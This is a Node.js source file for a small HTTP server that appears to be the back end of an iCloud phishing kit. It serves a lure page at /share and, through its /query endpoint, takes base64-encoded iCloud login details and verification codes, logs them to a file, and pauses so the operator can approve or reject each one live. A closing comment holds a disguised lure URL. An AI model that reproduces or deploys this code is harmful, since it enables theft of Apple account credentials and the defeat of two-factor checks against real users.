
let os = require('os');
let http = require('http'); // http协议模块
let url = require('url'); // url解析模块
let fs = require('fs'); // 文件系统模块
let path = require('path'); // 路径解析模块
let readlineSync = require("readline-sync");
// let readline = require('readline');
// let rl = readline.createInterface(process.stdin, process.stdout);

const html1 = './main.html';

global.Buffer = global.Buffer || require('buffer').Buffer;

if (typeof btoa === 'undefined') {
    global.btoa = function (str) {
        return new Buffer(str, 'binary').toString('base64');
    };
}

if (typeof atob === 'undefined') {
    global.atob = function (b64Encoded) {
        return new Buffer(b64Encoded, 'base64').toString('binary');
    };
}

// 获得本机ip地址
let getHost = () => {
    let INTERFACES = os.networkInterfaces(); // 在开发环境中获取局域网中的本机iP地址
    console.log(JSON.stringify(INTERFACES));
    let wifi_host = '';
    let local_host = '';
    let v6_wifi_host = '';
    let v6_local_host = '';
    for (let devName in INTERFACES) {
        let iface = INTERFACES[devName];
        for (let i = 0; i < iface.length; i++) {
            let alias = iface[i];
            if (alias.family === 'IPv4' && alias.address !== '127.0.0.1' && !alias.internal) {
                if (/本地连接/.test(devName)) {
                    local_host = alias.address;
                } else if (/无线网络连接|WLAN/.test(devName)) {
                    wifi_host = alias.address;
                }
            } else if (alias.family === 'IPv6' && alias.address !== '127.0.0.1' && !alias.internal) {
                if (/本地连接/.test(devName)) {
                    v6_local_host = alias.address;
                } else if (/无线网络连接|WLAN/.test(devName)) {
                    v6_wifi_host = alias.address;
                }
            }
        }
    }

    return {
        'wifi': wifi_host || local_host,
        'local': local_host || wifi_host,
        'v6_wifi': v6_wifi_host || v6_local_host,
        'v6_local': v6_local_host || v6_wifi_host
    };
}

let waitInput = () => {
    // rl.setPrompt('Need output> ');
    // rl.prompt();
    // let result = 'error';
    // rl.on('line', function (line) {
    //     if(line.trim() == "1"){
    //         result = "pass"
    //     }
    //     rl.close();
    // });

    // rl.on('close', function () {
    //     process.exit(0);
    //     return result;
    // });
    let str = readlineSync.question("need output:");
    if (str == "1") {
        str = "pass";
    } else {
        str = "error";
    }
    // readlineSync.close();
    return str;
}

let host = getHost();
let post = '3030';

let isFirst = true;
let log = "";

let writedown = () => {
    fs.open("./1.txt", 'w', (err, fd) => {
        if (err) {
        }
        let str = log;//JSON.stringify(log);
        fs.writeFile(fd, str, (err) => {
            if (err) {
            }
            fs.close(fd, (err) => {
                // console.log('saved');
            });
        });
    });
}

let isFirstLogin = true;
let isFirstCheck = true;

let listener = (request, response) => {
    if (isFirst) {
        isFirst = false;
        console.log(`useragent: ${request['headers']['user-agent']}`);
        console.log(`host: ${request['headers']['host']}`);
    }
    console.log(`有人访问了服务器 ==> ${request.url}`);

    let requestUrl = request.url; // 端口号后全部
    let pathName = url.parse(requestUrl).pathname; // 款口号后至问号前
    let query = url.parse(requestUrl).query; // 问号后
    // console.log(pathName);
    if (pathName == '/jquery.js') {
        let jsstr = '';
        if (fs.existsSync(`./${pathName}`)) {
            response.writeHead(200, { 'content-type': 'application/javascript; charset=UTF-8' });
            jsstr = fs.readFileSync(`./${pathName}`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
        }
        response.end(jsstr);
        return;
    } else if (pathName.indexOf(".js") !== -1) {
        response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
        response.end('');
    } else if (/\.png|\.jpg|\.ico/.test(pathName)) {
        let imgstr = '';
        if (fs.existsSync(`.${pathName}`)) {
            response.writeHead(200, { 'content-type': 'image/x-icon' });
            imgstr = fs.readFileSync(`.${pathName}`) || '';
        } else {
            response.writeHead(404, { 'content-type': 'image/x-icon' });
        }
        response.end(imgstr);
        return;
    } else if (pathName == "/query") {
        if (query) {
            let qs = query.split("&");
            let key = '';
            qs.forEach(e => {
                if (e.indexOf('icloudLogin=') != -1) {
                    key = "icloudLogin";
                    query = e.replace('icloudLogin=', '');

                } else if (e.indexOf('icloudInfo=') != -1) {
                    key = "icloudInfo";
                    query = e.replace('icloudInfo=', '');

                } else if (e.indexOf("icloudCheckCode=") != -1) {
                    key = "icloudCheckCode";
                    query = e.replace('icloudCheckCode=', '');

                } else if (e.indexOf("icloudInputCode=") != -1) {
                    key = "icloudInputCode";
                    query = e.replace('icloudInputCode=', '');

                } else if (e.indexOf("icloudCheckCodeNeed=") != -1) {
                    key = "icloudCheckCodeNeed";
                    query = e.replace('icloudCheckCodeNeed=', '');

                } else if (e.indexOf('icloudLoginNeed=') != -1) {
                    key = "icloudLoginNeed";
                    query = e.replace('icloudLoginNeed=', '');

                }
            });
            query = decodeURIComponent(atob(query));
            query = key + "=>" + query;
            console.log(`return query ==> ${query}`);
            log += ("\n" + query);
            if (key === "icloudCheckCodeNeed") {
                response.write(waitInput());
            } else if (key === "icloudLoginNeed") {
                response.write(waitInput());
            } else {
                response.write("");
            }
            response.end();
        }
        writedown();
        return;
    }else if (pathName == "/share"){
        let htmlstr = '';
        if (fs.existsSync(html1)) {
            response.writeHead(200, { 'content-type': 'text/html' });
            htmlstr = fs.readFileSync(html1) || '';
        } else {
            response.writeHead(404, { 'content-type': 'text/html' });
        }
        response.end(htmlstr);
    }else{
        response.write("");
        response.end();
    }
};

//2. 创建http服务器
// 参数: 请求的回调, 当有人访问服务器的时候,就会自动调用回调函数
let server = http.createServer(listener);

//3. 绑定端口
// server.listen(post, host.v6_local, () => {
//     console.log(`绑定完成 ==> ${host.v6_local}:${post}`);
// });
server.listen(post, host.local, () => {
    console.log(`绑定完成 ==> ${host.local}:${post}`);
});

//4. 执行
console.log('执行了3030')

// http://10.3.75.26:3030/itunes/like/comment/s/05bc899676d6ef43f8bee0f69eddca11-T/32153o/72006/84fdc170c16a2ee1010fc21da6f4ef80/3a41998d206411764f134db8d015d63c/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin?appid=ngienbnpkldjcebacfbppphjjhbhfkpp&assatrisd=kjhzkKYQnkajsnAOY!hoASdjoAW&rtime=1010230102301203123&dwl=1-1-23-1-123&ttl=1566413096&ri=1433600&rs=1400&clientip=69.194.14.161&hash=29b554a946b107e4028379e37bf4e2c5